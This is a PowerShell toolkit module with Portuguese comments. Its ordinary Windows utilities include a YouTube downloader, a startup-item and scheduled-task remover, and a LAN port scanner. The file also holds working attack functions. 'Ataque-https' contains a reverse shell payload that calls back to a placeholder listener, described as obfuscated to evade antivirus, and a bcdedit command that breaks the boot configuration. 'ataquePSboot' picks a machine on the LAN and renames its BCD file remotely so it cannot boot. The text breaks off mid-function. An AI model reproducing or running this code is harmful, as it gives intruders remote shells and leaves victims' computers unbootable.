# ================================================
# Toolkit.psm1 - Módulo Corrigido e Organizado
# ================================================

# ==================== YOUTUBE DOWNLOAD ====================
function Invoke-youtubepw {
    <#
    .SYNOPSIS
        Abre interface gráfica para download de vídeos do YouTube
    #>

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    function Get-YouTubeVideoDownload {
        param (
            [string]$url,
            [string]$OutputPath
        )

        if (-not (Get-Command youtube-dl -ErrorAction SilentlyContinue)) {
            [System.Windows.Forms.MessageBox]::Show(
                "youtube-dl não está instalado. Por favor, instale youtube-dl e tente novamente.", 
                "Erro", 
                [System.Windows.Forms.MessageBoxButtons]::OK, 
                [System.Windows.Forms.MessageBoxIcon]::Error)
            return
        }

        $command = "youtube-dl -o `"$OutputPath%(title)s.%(ext)s`" `"$url`""

        try {
            Invoke-Expression $command
            [System.Windows.Forms.MessageBox]::Show("Download concluído com sucesso!", "Sucesso", 
                [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        }
        catch {
            [System.Windows.Forms.MessageBox]::Show("Erro ao tentar baixar o vídeo: $_", "Erro", 
                [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        }
    }

    # Interface Gráfica
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Download YouTube Video"
    $form.Size = New-Object System.Drawing.Size(420, 220)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false

    $labelUrl = New-Object System.Windows.Forms.Label
    $labelUrl.Text = "URL do vídeo:"
    $labelUrl.Location = New-Object System.Drawing.Point(20, 20)
    $form.Controls.Add($labelUrl)

    $textboxUrl = New-Object System.Windows.Forms.TextBox
    $textboxUrl.Size = New-Object System.Drawing.Size(360, 23)
    $textboxUrl.Location = New-Object System.Drawing.Point(20, 45)
    $form.Controls.Add($textboxUrl)

    $labelOutput = New-Object System.Windows.Forms.Label
    $labelOutput.Text = "Pasta de saída:"
    $labelOutput.Location = New-Object System.Drawing.Point(20, 80)
    $form.Controls.Add($labelOutput)

    $textboxOutput = New-Object System.Windows.Forms.TextBox
    $textboxOutput.Size = New-Object System.Drawing.Size(360, 23)
    $textboxOutput.Location = New-Object System.Drawing.Point(20, 105)
    $textboxOutput.Text = "$env:USERPROFILE\Downloads\"
    $form.Controls.Add($textboxOutput)

    $buttonDownload = New-Object System.Windows.Forms.Button
    $buttonDownload.Text = "Iniciar Download"
    $buttonDownload.Location = New-Object System.Drawing.Point(140, 150)
    $buttonDownload.Size = New-Object System.Drawing.Size(140, 35)
    $buttonDownload.Add_Click({
        if ([string]::IsNullOrWhiteSpace($textboxUrl.Text)) {
            [System.Windows.Forms.MessageBox]::Show("Insira uma URL válida.", "Aviso", "OK", "Warning")
            return
        }
        Get-YouTubeVideoDownload -url $textboxUrl.Text -OutputPath $textboxOutput.Text
        $form.Close()
    })
    $form.Controls.Add($buttonDownload)

    $form.Add_Shown({$form.Activate()})
    [System.Windows.Forms.Application]::Run($form)
}


# ==================== SVCHOST SUSPICIOSO ====================
function Invoke-APANHASVCHOSTVIRUS {
    <#
    .SYNOPSIS
        Lista processos svchost.exe sem serviços associados (possível malware)
    #>
    function Get-SvchostWithoutService {
        $contador = 0
        $svchostProcesses = Get-Process -Name svchost -ErrorAction SilentlyContinue | Where-Object { $_.Path }

        foreach ($process in $svchostProcesses) {
            try {
                $services = Get-WmiObject -Class Win32_Service -Filter "ProcessId = $($process.Id)" -ErrorAction SilentlyContinue
                if ($services.Count -eq 0) {
                    Write-Host "Processo suspeito encontrado!" -ForegroundColor Red
                    Write-Host "PID: $($process.Id)" -ForegroundColor Yellow
                    Write-Host "Caminho: $($process.Path)" -ForegroundColor Yellow
                    Write-Host "---------------------------------------"
                    $contador++
                }
            }
            catch { }
        }

        Write-Host "`nTotal de svchost.exe sem serviços associados: $contador" -ForegroundColor Cyan
    }

    Get-SvchostWithoutService
}


# ==================== RUNDLL32 FUNCTIONS ====================
function Invoke-askdllrundll32 {
    Get-DllRundll32Commands
}

function Get-DllRundll32Commands {
    param (
        [string]$DumpBinPath = "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.43.34808\bin\Hostx64\x86\dumpbin.exe",
        [switch]$NoPagination
    )

    if (-not (Test-Path $DumpBinPath)) {
        Write-Host "Erro: dumpbin.exe não encontrado no caminho especificado." -ForegroundColor Red
        return
    }

    $dllName = Read-Host "Digite o nome da DLL (ex: shell32.dll)"
    if ([string]::IsNullOrWhiteSpace($dllName)) {
        Write-Host "Nome da DLL não pode estar vazio." -ForegroundColor Red
        return
    }

    $dllPath = "$env:SystemRoot\System32\$dllName"
    if (-not (Test-Path $dllPath)) {
        Write-Host "DLL '$dllName' não encontrada em System32." -ForegroundColor Red
        return
    }

    Write-Host "Listando funções exportadas de $dllName..." -ForegroundColor Yellow

    try {
        $functions = & $DumpBinPath /exports $dllPath 2>&1 |
                     Select-String -Pattern "^\s+\d+\s+\w+\s+[\w@?#$%&*]+" |
                     ForEach-Object { ($_ -split "\s+")[-1] }

        Write-Host "`nDLL: $dllName`n" -ForegroundColor Green
        foreach ($func in $functions) {
            "  rundll32.exe $dllName,$func"
        }
    }
    catch {
        Write-Host "Erro ao processar a DLL: $_" -ForegroundColor Red
    }
}


# ==================== OUTRAS FUNÇÕES CORRIGIDAS ====================

function Invoke-GetUnassociatedSvchost {
    Get-UnassociatedSvchost
}

function Invoke-LargeFiles {
    # Procura arquivos maiores que 1GB
    Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Length -gt 1GB } |
        Select-Object FullName, 
                      @{Name="SizeGB"; Expression={[math]::Round($_.Length/1GB, 2)}},
                      LastWriteTime |
        Sort-Object Length -Descending |
        Format-Table -AutoSize
}

function Invoke-filesearch1 {
    Invoke-LargeFiles
}

function Invoke-listapids {
    $connections = netstat -ano | Select-String "ESTABLISHED"

    foreach ($line in $connections) {
        $parts = ($line -replace "\s+", " ").Trim().Split(" ")
        $procId = $parts[-1]

        if ($procId -match "^\d+$") {
            $proc = Get-CimInstance Win32_Process -Filter "ProcessId=$procId" -ErrorAction SilentlyContinue
            [PSCustomObject]@{
                Proto        = $parts[0]
                Local        = $parts[1]
                Remote       = $parts[2]
                PID          = $procId
                Process      = $proc.Name
                Path         = $proc.ExecutablePath
            } | Format-List
        }
    }
}

function Invoke-removephone {
    Get-AppxPackage *YourPhone* -AllUsers | Remove-AppxPackage -ErrorAction SilentlyContinue
    Write-Host "Aplicação Your Phone / Phone Link removida (se existia)." -ForegroundColor Green
}

function Invoke-repararrede {
    Write-Host "=== REPARO DE REDE INICIADO ===" -ForegroundColor Cyan

    netsh winsock reset | Out-Null
    netsh int ip reset | Out-Null
    ipconfig /flushdns | Out-Null
    netsh advfirewall reset | Out-Null

    Write-Host "Rede resetada com sucesso!" -ForegroundColor Green
    Write-Host "Reinicie o computador para aplicar todas as alterações." -ForegroundColor Yellow
}

function Invoke-otimizacaopc {
    Write-Host "Limpando arquivos temporários..." -ForegroundColor Cyan
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Limpeza concluída!" -ForegroundColor Green
}

function Invoke-seeboottime {
    (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
}

function Invoke-startup {
    Get-CimInstance Win32_StartupCommand | 
        Select-Object Name, Command, Location | 
        Format-Table -AutoSize
}

function Invoke-RemoveRun {

    function Pause-Console {
        Read-Host "Pressione ENTER para continuar..."
    }

    function Show-Menu {
        Clear-Host
        Write-Host "===== GERENCIADOR DE STARTUP =====" -ForegroundColor Cyan
        Write-Host "1. Listar todos os itens"
        Write-Host "2. Buscar por nome"
        Write-Host "3. Remover por nome"
        Write-Host "4. Sair"
        Write-Host "=================================="
    }

    function Get-StartupItems {
        Get-CimInstance Win32_StartupCommand |
        Select-Object Name, Command, Location
    }

    function Convert-RegistryPath($path) {
        if ($path -like "HKLM*") {
            return $path -replace "^HKLM", "Registry::HKEY_LOCAL_MACHINE"
        }
        elseif ($path -like "HKCU*") {
            return $path -replace "^HKCU", "Registry::HKEY_CURRENT_USER"
        }
        return $null
    }

    function Is-Administrator {
        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
        return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    function Restart-AsAdmin {
        if (-not $PSCommandPath) {
            Write-Host "Execute manualmente como Administrador." -ForegroundColor Yellow
            return
        }

        Start-Process powershell -Verb RunAs -ArgumentList "-NoExit -File `"$PSCommandPath`""
        exit
    }

    function Remove-StartupItem($item) {

        if ($item.Location -match "Run") {

            $regPath = Convert-RegistryPath $item.Location

            if ($regPath -and (Test-Path $regPath)) {

                if ($regPath -like "*HKEY_LOCAL_MACHINE*" -and -not (Is-Administrator)) {
                    Write-Host "Requer privilégios de administrador." -ForegroundColor Yellow
                    return $false
                }

                $props = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue

                $matchingProp = $props.PSObject.Properties |
                    Where-Object { $_.Name -like "*$($item.Name)*" } |
                    Select-Object -First 1

                if ($matchingProp) {
                    try {
                        Remove-ItemProperty -Path $regPath -Name $matchingProp.Name -Force -ErrorAction Stop
                        Write-Host "✓ Removido: $($item.Name)" -ForegroundColor Green
                        return $true
                    }
                    catch {
                        Write-Host "Erro: $_" -ForegroundColor Red
                        return $false
                    }
                }
                else {
                    Write-Host "Item não encontrado no registo." -ForegroundColor Yellow
                    return $false
                }
            }
        }

        if ($item.Location -eq "Startup") {

            $paths = @(
                "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
                "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            )

            foreach ($p in $paths) {
				$fileName = Split-Path $item.Command -Leaf
				$fullPath = Join-Path $p $fileName

				if (Test-Path $fullPath) {
					try {
						Remove-Item $fullPath -Force -ErrorAction Stop
						Write-Host "✓ Removido: $fullPath" -ForegroundColor Green
						return $true
					}
					catch {
						Write-Host "Erro ao remover: $_" -ForegroundColor Red
					}
				}
			}

            Write-Host "Atalho não encontrado." -ForegroundColor Yellow
            return $false
        }

        Write-Host "Tipo não suportado." -ForegroundColor Yellow
        return $false
    }

    do {
        Show-Menu
        $opcao = Read-Host "Escolha uma opção"

        switch ($opcao) {

            "1" {
                Clear-Host
                Get-StartupItems | Format-Table -AutoSize
                Pause-Console
            }

            "2" {
                $nome = Read-Host "Digite parte do nome"
                $result = Get-StartupItems | Where-Object { $_.Name -like "*$nome*" }

                if ($result) {
                    $result | Format-Table -AutoSize
                } else {
                    Write-Host "Nenhum item encontrado." -ForegroundColor Yellow
                }

                Pause-Console
            }

            "3" {
                $nome = Read-Host "Digite parte do nome"
                $items = @(Get-StartupItems | Where-Object { $_.Name -like "*$nome*" })

                if ($items.Count -eq 0) {
                    Write-Host "Nenhum item encontrado." -ForegroundColor Yellow
                    Pause-Console
                    continue
                }

                for ($i = 0; $i -lt $items.Count; $i++) {
                    Write-Host "$($i+1). $($items[$i].Name)"
                }

                $index = Read-Host "Número (0 cancela)"

                if ($index -eq "0") { continue }

                if (-not ($index -as [int]) -or $index -lt 1 -or $index -gt $items.Count) {
                    Write-Host "Número inválido." -ForegroundColor Red
                    Pause-Console
                    continue
                }

                $selected = $items[$index - 1]

                $confirm = (Read-Host "Confirmar (s/n)").ToLower()

                if ($confirm -eq "s") {
                    Remove-StartupItem $selected
                }

                Pause-Console
            }

            "4" {
                Write-Host "Saindo..."
            }

            default {
                Write-Host "Opção inválida." -ForegroundColor Red
                Pause-Console
            }
        }

    } while ($opcao -ne "4")
}

function Invoke-ScannerBackup {

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # ⚠️ CORREÇÃO STA (segura)
    if ([System.Threading.Thread]::CurrentThread.ApartmentState -ne 'STA') {
        Write-Host "Execute no PowerShell com suporte STA (ex: powershell.exe -STA)" -ForegroundColor Yellow
        return
    }

    $global:StopScan = $false
    $font = New-Object System.Drawing.Font("Segoe UI",10)

    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Scanner de Rede Profissional"
    $form.Size = New-Object System.Drawing.Size(920,600)
    $form.StartPosition = "CenterScreen"
    $form.FormBorderStyle = "FixedDialog"
    $form.MaximizeBox = $false

    function New-Label($text,$x,$y){
        $l = New-Object System.Windows.Forms.Label
        $l.Text = $text
        $l.Location = New-Object System.Drawing.Point($x,$y)
        $l.Font = $font
        $l.AutoSize = $true
        return $l
    }

    $form.Controls.AddRange(@(
        (New-Label "IP Inicial:" 15 15),
        (New-Label "IP Final:" 15 45),
        (New-Label "Portas TCP:" 15 75)
    ))

    # INPUTS
    $txtStart = New-Object System.Windows.Forms.TextBox
    $txtStart.Location = New-Object System.Drawing.Point(190,12)
    $txtStart.Size = New-Object System.Drawing.Size(160,25)
    $txtStart.Text = "192.168.1.1"

    $txtEnd = New-Object System.Windows.Forms.TextBox
    $txtEnd.Location = New-Object System.Drawing.Point(190,42)
    $txtEnd.Size = New-Object System.Drawing.Size(160,25)
    $txtEnd.Text = "192.168.1.254"

    $txtPorts = New-Object System.Windows.Forms.TextBox
    $txtPorts.Location = New-Object System.Drawing.Point(190,72)
    $txtPorts.Size = New-Object System.Drawing.Size(260,25)
    $txtPorts.Text = "22,80,443,3389"

    $form.Controls.AddRange(@($txtStart,$txtEnd,$txtPorts))

    # BOTÕES
    $btnScan   = New-Object System.Windows.Forms.Button
    $btnStop   = New-Object System.Windows.Forms.Button
    $btnExport = New-Object System.Windows.Forms.Button
    $btnBCD    = New-Object System.Windows.Forms.Button

    $btnScan.Text   = "▶ Iniciar Scan"
    $btnStop.Text   = "Parar"
    $btnExport.Text = "Exportar CSV"
    $btnBCD.Text    = "Backup BCD"

    $btnScan.Location   = New-Object System.Drawing.Point(480,12)
    $btnStop.Location   = New-Object System.Drawing.Point(670,12)
    $btnExport.Location = New-Object System.Drawing.Point(480,52)
    $btnBCD.Location    = New-Object System.Drawing.Point(670,52)

    $btnScan.Size = $btnStop.Size = $btnExport.Size = $btnBCD.Size = New-Object System.Drawing.Size(170,35)
    $btnStop.Enabled = $false

    $form.Controls.AddRange(@($btnScan,$btnStop,$btnExport,$btnBCD))

    # PROGRESS
    $progress = New-Object System.Windows.Forms.ProgressBar
    $progress.Location = New-Object System.Drawing.Point(15,105)
    $progress.Size = New-Object System.Drawing.Size(875,20)
    $form.Controls.Add($progress)

    # LISTA
    $list = New-Object System.Windows.Forms.ListView
    $list.Location = New-Object System.Drawing.Point(15,140)
    $list.Size = New-Object System.Drawing.Size(875,400)
    $list.View = 'Details'
    $list.FullRowSelect = $true
    $list.GridLines = $true

    $list.Columns.Add("IP",140)       | Out-Null
    $list.Columns.Add("Hostname",230) | Out-Null
    $list.Columns.Add("Status",90)    | Out-Null
    $list.Columns.Add("Portas",390)   | Out-Null

    $form.Controls.Add($list)

    # FUNÇÕES
    function Valid-IP($ip){ [System.Net.IPAddress]::TryParse($ip,[ref]$null) }
    function Test-IP($ip){ Test-Connection $ip -Count 1 -Quiet -ErrorAction SilentlyContinue }

    function Get-Hostname($ip){
        try { [System.Net.Dns]::GetHostEntry($ip).HostName } catch { "" }
    }

    function Test-Port($ip,$port){
        try {
            $c = New-Object System.Net.Sockets.TcpClient
            $iar = $c.BeginConnect($ip,$port,$null,$null)
            if ($iar.AsyncWaitHandle.WaitOne(300) -and $c.Connected) {
                $c.EndConnect($iar); $c.Close(); return $true
            }
            $c.Close()
        } catch {}
        return $false
    }

    # SCAN
    $btnScan.Add_Click({

        if (!(Valid-IP $txtStart.Text) -or !(Valid-IP $txtEnd.Text)) {
            [System.Windows.Forms.MessageBox]::Show("IPs inválidos.")
            return
        }

        $ports = $txtPorts.Text.Split(',') | Where-Object { $_ -match '^\d+$' } | ForEach-Object {[int]$_}

        if ($ports.Count -eq 0) {
            [System.Windows.Forms.MessageBox]::Show("Portas inválidas.")
            return
        }

        $btnScan.Enabled = $false
        $btnStop.Enabled = $true
        $list.Items.Clear()
        $global:StopScan = $false

        $s = $txtStart.Text.Split('.')
        $e = $txtEnd.Text.Split('.')
        $base = "$($s[0]).$($s[1]).$($s[2])"

        $ips = for ($i=[int]$s[3]; $i -le [int]$e[3]; $i++) { "$base.$i" }

        $progress.Value = 0
        $progress.Maximum = $ips.Count

        foreach ($ip in $ips){
            if ($global:StopScan){ break }

            $progress.Value++
            [System.Windows.Forms.Application]::DoEvents()

            if (Test-IP $ip){
                $open = foreach ($p in $ports){ if (Test-Port $ip $p){ $p } }

                $item = New-Object System.Windows.Forms.ListViewItem($ip)
                $item.SubItems.Add((Get-Hostname $ip)) | Out-Null
                $item.SubItems.Add("Ativo") | Out-Null
                $item.SubItems.Add(($open -join ", ")) | Out-Null
                $list.Items.Add($item) | Out-Null
            }
        }

        $btnScan.Enabled = $true
        $btnStop.Enabled = $false
    })

    # STOP
    $btnStop.Add_Click({ $global:StopScan = $true })

    # EXPORT
    $btnExport.Add_Click({
        if ($list.Items.Count -eq 0){
            [System.Windows.Forms.MessageBox]::Show("Sem dados.")
            return
        }

        $dlg = New-Object System.Windows.Forms.SaveFileDialog
        $dlg.Filter = "CSV (*.csv)|*.csv"

        if ($dlg.ShowDialog() -ne 'OK'){ return }

        $list.Items | ForEach-Object {
            [PSCustomObject]@{
                IP       = $_.Text
                Hostname = $_.SubItems[1].Text
                Status   = $_.SubItems[2].Text
                Portas   = $_.SubItems[3].Text
            }
        } | Export-Csv $dlg.FileName -NoTypeInformation -Encoding UTF8
    })

    # BCD
    $btnBCD.Add_Click({
        $dlg = New-Object System.Windows.Forms.SaveFileDialog
        $dlg.Filter = "BCD (*.bcd)|*.bcd"

        if ($dlg.ShowDialog() -ne 'OK'){ return }

        try {
            bcdedit /export $dlg.FileName | Out-Null
            [System.Windows.Forms.MessageBox]::Show("Backup BCD criado.")
        }
        catch {
            [System.Windows.Forms.MessageBox]::Show("Execute como administrador.")
        }
    })

    [System.Windows.Forms.Application]::Run($form)
}

function Ataque-https{
	
	# Script de ataque PowerShell para porta HTTPS (443) - Reverse Shell + bcdedit
# Autorizado para pentest - Executa bcdedit remotamente via HTTPS

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP,
    
    [Parameter(Mandatory=$false)]
    [int]$Port = 443,
    
    [Parameter(Mandatory=$false)]
    [string]$LHOST = "SEU_IP_AQUI",  # IP do seu listener
    
    [Parameter(Mandatory=$false)]
    [int]$LPORT = 4444              # Porta do seu listener
)

# Função para criar payload reverse shell via HTTPS
function Invoke-HTTPSReverseShell {
    param($Target, $Port, $LHOST, $LPORT)
    
    # Comando bcdedit específico a ser executado
    $bcdeditCmd = "bcdedit /set `{current`} device partition=Z:"
    
    # Payload PowerShell obfuscado para bypass AV/EDR
    $payload = @"
`$sm = New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);
`$st = `$sm.GetStream();
[byte[]]`$bt = 0..65535|%{0};
while((`$i = `$st.Read(`$bt, 0, `$bt.Length)) -ne 0){
    `$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bt,0, `$i);
    `$sb = (iex `$d 2>&1 | Out-String );
    `$sb2 = `$sb + 'PS ' + (pwd).Path + '> ';
    `$sendback = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes(`$sb2);
    `$st.Write(`$sendback,0,`$sendback.Length);
    `$st.Flush()};
`$sm.Close()
"@
    
    # Executa o comando bcdedit ANTES do reverse shell
    Write-Host "[+] Executando bcdedit: $bcdeditCmd" -ForegroundColor Green
    Invoke-Expression $bcdeditCmd
    
    # Aguarda 2 segundos para garantir execução do bcdedit
    Start-Sleep 2
    
    Write-Host "[+] Iniciando reverse shell para $LHOST`:$LPORT" -ForegroundColor Green
    Invoke-Expression $payload
}

# Verifica se está rodando como admin (necessário para bcdedit)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] Elevando privilégios para executar bcdedit..." -ForegroundColor Yellow
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -C `"& {$($MyInvocation.MyCommand.Definition)} -TargetIP $TargetIP -LHOST $LHOST -LPORT $LPORT`""
    exit
}

# Escaneia porta HTTPS antes do ataque
try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.ReceiveTimeout = 3000
    $tcp.SendTimeout = 3000
    $connect = $tcp.BeginConnect($TargetIP, $Port, $null, $null)
    $wait = $connect.AsyncWaitHandle.WaitOne(3000, $false)
    if ($wait) {
        Write-Host "[+] Porta $Port aberta em $TargetIP - HTTPS detectado" -ForegroundColor Green
        $tcp.EndConnect($connect)
    } else {
        Write-Host "[-] Porta $Port fechada em $TargetIP" -ForegroundColor Red
        exit
    }
    $tcp.Close()
} catch {
    Write-Host "[-] Erro ao conectar em $TargetIP`:$Port" -ForegroundColor Red
    exit
}

# Executa o ataque
Write-Host "[*] Iniciando ataque HTTPS em $TargetIP`:$Port" -ForegroundColor Cyan
Invoke-HTTPSReverseShell -Target $TargetIP -Port $Port -LHOST $LHOST -LPORT $LPORT

	
}

function ataquePSboot{
	
	# Script de Análise Real da Rede
# Autorizado para Penetration Testing

Write-Host "=== ANALISADOR DE REDE ===" -ForegroundColor Magenta

# Função para escanear IPs ativos
function Scan-Network {
    Write-Host "Analisando sua rede local..." -ForegroundColor Yellow
    
    # Obtém o IP local
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixOrigin -eq "Dhcp" -or $_.PrefixOrigin -eq "Manual"} | Select-Object -First 1).IPAddress
    
    if (!$localIP) {
        Write-Host "Erro: Não foi possível detectar seu IP local" -ForegroundColor Red
        return @()
    }
    
    Write-Host "Seu IP: $localIP" -ForegroundColor Green
    
    # Calcula a rede
    $ipParts = $localIP.Split('.')
    $networkBase = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2])"
    Write-Host "Rede: $networkBase.0/24" -ForegroundColor Cyan
    Write-Host ""
    
    $activeIPs = @()
    Write-Host "Escaneando IPs 1-20..." -ForegroundColor White
    
    # Escaneia IPs de 1 a 20
    for ($i = 1; $i -le 20; $i++) {
        $targetIP = "$networkBase.$i"
        
        # Teste de ping
        $ping = New-Object System.Net.NetworkInformation.Ping
        $result = $ping.Send($targetIP, 500)
        
        if ($result.Status -eq "Success") {
            Write-Host "$targetIP - ATIVO" -ForegroundColor Green
            $activeIPs += $targetIP
        }
    }
    
    return $activeIPs
}

# INÍCIO DO SCRIPT
Clear-Host
Write-Host "=== ANALISADOR DE REDE ===" -ForegroundColor Magenta
Write-Host ""
    
# FASE 1: Análise da Rede
Write-Host "FASE 1: ANALISANDO SUA REDE" -ForegroundColor Green

$ips = Scan-Network

if ($ips.Count -eq 0) {
    Write-Host "Nenhum IP ativo encontrado na rede." -ForegroundColor Red
exit
}

Write-Host "`nIPS ATIVOS ENCONTRADOS:" -ForegroundColor Cyan
Write-Host "----------------------------------------" -ForegroundColor Cyan

for ($i = 0; $i -lt $ips.Count; $i++) {
    Write-Host "$($i+1). $($ips[$i])" -ForegroundColor White
}

Write-Host ""

# FASE 2: Seleção do Alvo
Write-Host "FASE 2: SELECIONAR ALVO" -ForegroundColor Green

do {
    Write-Host "Digite o número do IP que quer atacar:" -ForegroundColor Yellow
$choice = Read-Host "Numero"

if ($choice -ge 1 -and $choice -le $ips.Count) {
    $target = $ips[$choice-1]
    Write-Host "IP selecionado: $target" -ForegroundColor Green
    break
}
else {
    Write-Host "Número inválido. Digite entre 1 e $($ips.Count)" -ForegroundColor Red
}
} while ($true)

Write-Host ""

# FASE 3: Confirmação
Write-Host "Confirmar ataque em $target?" -ForegroundColor Yellow
$confirm = Read-Host "Digite S para SIM"

if ($confirm -eq "S" -or $confirm -eq "s") {
    Write-Host "Executando comando: ren bcd bcd.old" -ForegroundColor White


    Invoke-Command -ComputerName $target -ScriptBlock {
        ren bcd bcd.old
    }
    Write-Host "Comando executado com sucesso!" -ForegroundColor Green
}
else {
    Write-Host "Ataque cancelado" -ForegroundColor Yellow
}


Write-Host "`nScript finalizado" -ForegroundColor Magenta
	
}

function Invoke-Removertarefa{
	
	Clear-Host

Write-Host "===================================" -ForegroundColor Cyan
Write-Host " TAREFAS AGENDADAS NO SISTEMA"
Write-Host "===================================" -ForegroundColor Cyan
Write-Host ""

$tasks = Get-ScheduledTask | Sort-Object TaskName

if ($tasks.Count -eq 0) {
    Write-Host "Nenhuma tarefa encontrada."
    exit
}

Write-Host "Total de tarefas: $($tasks.Count)"
Write-Host ""

for ($i = 0; $i -lt $tasks.Count; $i++) {
    Write-Host "$($i+1) - $($tasks[$i].TaskName)" -ForegroundColor Green
}

do {
    Write-Host ""
    $selection = Read-Host "Digite um número entre 1 e $($tasks.Count)"

    $valido = $selection -match '^\d+$' -and
              [int]$selection -ge 1 -and
              [int]$selection -le $tasks.Count

    if (-not $valido) {
        Write-Host "Número inválido. Tente novamente." -ForegroundColor Red
    }

} until ($valido)

$selectedTask = $tasks[[int]$selection - 1]

Write-Host ""
Write-Host "Selecionado: $($selectedTask.TaskName)" -ForegroundColor Yellow

$confirm = Read-Host "Tem certeza que deseja apagar? (S/N)"

if ($confirm -match '^[sS]$') {
    Unregister-ScheduledTask `
        -TaskName $selectedTask.TaskName `
        -TaskPath $selectedTask.TaskPath `
        -Confirm:$false

    Write-Host "Tarefa removida com sucesso." -ForegroundColor Red
}
else {
    Write-Host "Operação cancelada." -ForegroundColor Cyan
}

Write-Host ""
Write-Host "Processo finalizado."
	
}

function Invoke-Detetor-so{
	
	param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP
)

# Função avançada de scan TCP SYN
function Test-TCPPortAdvanced {
    param($IP, $Port, $Timeout = 2000)
    try {
        $socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
        $socket.ReceiveTimeout = $Timeout
        $socket.SendTimeout = $Timeout
        $socket.Blocking = $false
        $connect = $socket.BeginConnect([System.Net.IPAddress]::Parse($IP), $Port, $null, $null)
        $wait = $connect.AsyncWaitHandle.WaitOne($Timeout, $false)
        
        if ($wait -and $socket.Connected) {
            $socket.EndConnect($connect)
            $socket.Close()
            return $true
        }
    }
    catch {}
    finally {
        if ($socket) { $socket.Close() }
    }
    return $false
}

# Fingerprinting por TTL e ICMP
function Get-TTLFingerprint {
    param([string]$IP)
    
    # Teste ICMP (ping)
    $ping = Test-Connection $IP -Count 1 -Quiet -ErrorAction SilentlyContinue
    
    # TTL fingerprinting via traceroute manual
    $ttlPatterns = @{
        "Windows" = @(1, 128)
        "Linux"   = @(1, 64, 255)
        "Android" = @(1, 64)
        "iOS/macOS" = @(1, 64, 255)
    }
    
    $ttlResponse = & nmap --script=icmp-seq --packet-trace $IP -sn -T4 2>&1
    # Fallback TTL via ping detalhado
    $pingResult = ping -n 1 -w 2000 $IP 2>&1
    $ttl = ($pingResult | Select-String "TTL=(\d+)").Matches.Groups[1].Value
    
    if ($ttl) {
        if ($ttl -eq "128") { return "Windows" }
        elseif ($ttl -eq "64") { return "Linux/Android" }
        elseif ($ttl -eq "255") { return "iOS/macOS" }
    }
    
    return "Unknown"
}

# Scan agressivo de portas
function Scan-PortsAggressive {
    param([string]$IP)
    
    Write-Host "[-] Scan agressivo de 1000 portas comuns..." -ForegroundColor Cyan
    $commonPorts = 21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5900,8080,8443,445,1433,5985,5986
    
    $openPorts = @{}
    $progress = 0
    foreach ($port in $commonPorts) {
        $progress++
        Write-Progress -Activity "Scanning ports" -Status "$progress/$($commonPorts.Count)" -PercentComplete (($progress/$commonPorts.Count)*100)
        
        if (Test-TCPPortAdvanced -IP $IP -Port $port) {
            $service = switch($port) {
                21 {"FTP"} 22{"SSH"} 23{"Telnet"} 25{"SMTP"}
                53{"DNS"} 80{"HTTP"} 110{"POP3"} 111{"RPC"}
                135{"RPC"} 139{"NetBIOS"} 143{"IMAP"}
                443{"HTTPS"} 993{"IMAPS"} 995{"POP3S"}
                1723{"PPTP"} 3306{"MySQL"} 3389{"RDP"}
                5900{"VNC"} 8080{"HTTP-Alt"} 8443{"HTTPS-Alt"}
                445{"SMB"} 1433{"MSSQL"} 5985{"WinRM"}
                5986{"WinRM-HTTPS"} default{"Unknown"}
            }
            $openPorts[$service] = $port
            Write-Host "  [+] $port/$service ABERTA" -ForegroundColor Green
        }
    }
    Write-Progress -Activity "Scanning ports" -Completed
    return $openPorts
}

# Detecção avançada de OS
function Detect-OSAdvanced {
    param([string]$IP)
    
    Write-Host "[-] Fingerprinting TTL/ICMP..." -ForegroundColor Yellow
    $ttlOS = Get-TTLFingerprint -IP $IP
    
    Write-Host "[-] TTL sugere: $ttlOS" -ForegroundColor Cyan
    
    $ports = Scan-PortsAggressive -IP $IP
    
    # Lógica de detecção refinada
    $os = "Unknown"
    $confidence = "Low"
    
    # Windows signatures
    $windowsPorts = @("RDP","WinRM","WinRM-HTTPS","SMB","NetBIOS","RPC")
    $windowsCount = ($ports.Keys | Where-Object { $windowsPorts -contains $_ }).Count
    if ($windowsCount -gt 0 -or $ttlOS -eq "Windows") {
        $os = "Windows"
        $confidence = if ($windowsCount -gt 1) { "High" } else { "Medium" }
    }
    
    # Android/iOS via portas web + TTL
